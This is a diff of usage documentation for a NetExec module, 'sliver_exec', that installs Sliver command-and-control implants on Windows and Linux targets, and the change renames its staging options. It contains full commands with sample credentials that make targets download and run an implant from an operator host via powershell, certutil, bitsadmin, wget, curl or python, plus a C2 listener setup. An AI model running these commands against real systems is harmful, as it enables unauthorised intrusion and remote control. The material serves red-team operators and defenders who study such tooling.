@@ -159,8 +159,8 @@ Lightweight deployment mode where the target downloads the implant from a Sliver
 ```bash
 nxc winrm 192.168.1.10 -u Administrator -p 'P@ssw0rd!' \
   -M sliver_exec \
-  -o RHOST=10.0.0.5 \
-     STAGING=http STAGING_PORT=8080
+   -o RHOST=10.0.0.5 \
+     STAGING=download HTTP_STAGING_PORT=8080
 ```
 
 **What happens:**
@@ -178,9 +178,9 @@ nxc winrm 192.168.1.10 -u Administrator -p 'P@ssw0rd!' \
 7. Module removes website and stops HTTP listener
 8. Implant file deleted from target
 
-**Note:** 
+**Note:**
 - `DOWNLOAD_TOOL` defaults to `powershell` for WinRM if not specified (protocol-specific: MSSQL defaults to `certutil`, SMB Windows defaults to `powershell`)
-- `STAGER_RHOST` defaults to `RHOST` (same server for staging and C2)
+- `SHELLCODE_LISTENER_HOST` defaults to `RHOST` (same server for staging and C2)
 - Final C2 callback uses default port 443 unless `RPORT` is specified
 
 **Expected output:**
@@ -210,7 +210,7 @@ WINRM       192.168.1.10    5985   TARGET01  [+] Stopped HTTP listener (Job ID: 
 nxc smb 192.168.1.0/24 -u admin -p 'SecurePass123' \
   -M sliver_exec \
   -o RHOST=10.0.0.5 RPORT=8888 \
-     STAGING=http STAGING_PORT=8080 DOWNLOAD_TOOL=certutil
+     STAGING=download HTTP_STAGING_PORT=8080 DOWNLOAD_TOOL=certutil
 ```
 
 **What happens:**
@@ -229,7 +229,7 @@ nxc smb 192.168.1.0/24 -u admin -p 'SecurePass123' \
 nxc winrm 192.168.1.10 -u Administrator -p 'P@ssw0rd!' \
   -M sliver_exec \
   -o RHOST=10.0.0.5 RPORT=8888 \
-     STAGING=http STAGING_PORT=8080 DOWNLOAD_TOOL=bitsadmin
+     STAGING=download HTTP_STAGING_PORT=8080 DOWNLOAD_TOOL=bitsadmin
 ```
 
 **What happens:**
@@ -248,7 +248,7 @@ nxc winrm 192.168.1.10 -u Administrator -p 'P@ssw0rd!' \
 nxc winrm 192.168.1.10 -u Administrator -p 'P@ssw0rd!' \
   -M sliver_exec \
   -o RHOST=10.0.0.5 RPORT=8888 \
-     STAGING=http STAGING_PORT=9090 DOWNLOAD_TOOL=powershell
+     STAGING=download HTTP_STAGING_PORT=9090 DOWNLOAD_TOOL=powershell
 ```
 
 **Note:** HTTP staging currently uses HTTP only. HTTPS support is planned for a future release.
@@ -262,19 +262,19 @@ HTTP staging also works for Linux targets using wget, curl, or python download m
 nxc ssh 192.168.1.50 -u root -p 'toor' \
   -M sliver_exec \
   -o RHOST=10.0.0.5 RPORT=8888 \
-     STAGING=http STAGING_PORT=8080 DOWNLOAD_TOOL=wget
+     STAGING=download HTTP_STAGING_PORT=8080 DOWNLOAD_TOOL=wget
 
 # Using curl
 nxc ssh 192.168.1.50 -u root -p 'toor' \
   -M sliver_exec \
   -o RHOST=10.0.0.5 RPORT=8888 \
-     STAGING=http STAGING_PORT=8080 DOWNLOAD_TOOL=curl
+     STAGING=download HTTP_STAGING_PORT=8080 DOWNLOAD_TOOL=curl
 
 # Using python (if wget/curl unavailable)
 nxc ssh 192.168.1.50 -u root -p 'toor' \
   -M sliver_exec \
   -o RHOST=10.0.0.5 RPORT=8888 \
-     STAGING=http STAGING_PORT=8080 DOWNLOAD_TOOL=python
+     STAGING=download HTTP_STAGING_PORT=8080 DOWNLOAD_TOOL=python
 ```
 
 **What happens:**
@@ -296,7 +296,7 @@ nxc ssh 192.168.1.50 -u root -p 'toor' \
 nxc smb 10.2.10.0/24 -u admin -p 'SecurePass123' \
   -M sliver_exec \
   -o RHOST=192.168.1.100 \
-     STAGING=http STAGING_PORT=8080
+     STAGING=download HTTP_STAGING_PORT=8080
 ```
 
 **Note:** `DOWNLOAD_TOOL` defaults to `powershell` for SMB Windows if not specified (protocol-specific: MSSQL defaults to `certutil`, WinRM defaults to `powershell`)
@@ -325,20 +325,16 @@ nxc smb 10.2.10.0/24 -u admin -p 'SecurePass123' \
 | `CLEANUP_MODE` | `always` | When to cleanup: `always`, `success` (only if beacon registers), or `never` |
 | `WAIT` | `90` | Seconds to wait for beacon callback |
 | `FORMAT` | `exe` | Implant format (only `exe` supported currently) |
-| `STAGING` | `False` | Staging mode: `http`, `tcp`, `https`, or `False` to disable |
-| `STAGER_RHOST` | `RHOST` | Stager listener IP (defaults to same as RHOST) |
-| `STAGER_RPORT` | `RPORT` | Stager listener port (defaults to same as RPORT) |
-| `STAGING_PORT` | `8080` | HTTP port for hosting implant (HTTP download staging) |
+| `STAGING` | `False` | Staging mode: `download`, `shellcode`, `none`, or `False` to disable |
+| `SHELLCODE_LISTENER_HOST` | `RHOST` | Stager listener IP (defaults to same as RHOST) |
+| `SHELLCODE_LISTENER_PORT` | `RPORT` | Stager listener port (defaults to same as RPORT) |
+| `HTTP_STAGING_PORT` | `8080` | HTTP port for hosting implant (HTTP download staging) |
+| `SHELLCODE_PROTOCOL` | `tcp` | Shellcode protocol: `tcp`, `http`, `https` |
 | `DOWNLOAD_TOOL` | Protocol-specific | Download method - Windows: `powershell`, `certutil`, `bitsadmin`; Linux: `wget`, `curl`, `python`. Defaults: MSSQL→`certutil`, SMB Windows→`powershell`, WinRM→`powershell` |
 | `PROFILE` | None | Use existing Sliver profile instead of generating new implant |
 | `SHARE` | `C$` | SMB share for file upload (SMB protocol only) |
 
-*\* Either `RHOST` or `PROFILE` must be provided*
-
-**Backward Compatibility:** Old option names are still supported:
-- `STAGER_PORT` → Use `STAGING_PORT` (new)
-- `STAGING_METHOD` → Use `DOWNLOAD_TOOL` (new)
-- `STAGING=True` + `STAGER_PROTOCOL=http` → Use `STAGING=http` (new)
+ *\* Either `RHOST` or `PROFILE` must be provided*
 
 ### Using Sliver Profiles
 
@@ -511,11 +507,11 @@ sliver (SUBTLE_REFRIGERATOR) > shell
 # 1. Start Sliver mTLS listener
 sliver > mtls -l 0.0.0.0 -p 8888
 
-# 2. Deploy with HTTP staging
+ # 2. Deploy with HTTP staging
 nxc winrm 192.168.1.50 -u Administrator -p 'SecurePass!' \
   -M sliver_exec \
   -o RHOST=10.0.0.5 RPORT=8888 \
-     STAGING=True STAGER_PORT=8080 \
+     STAGING=download HTTP_STAGING_PORT=8080 \
      WAIT=120
 
 # 3. Verify beacon and cleanup occurred
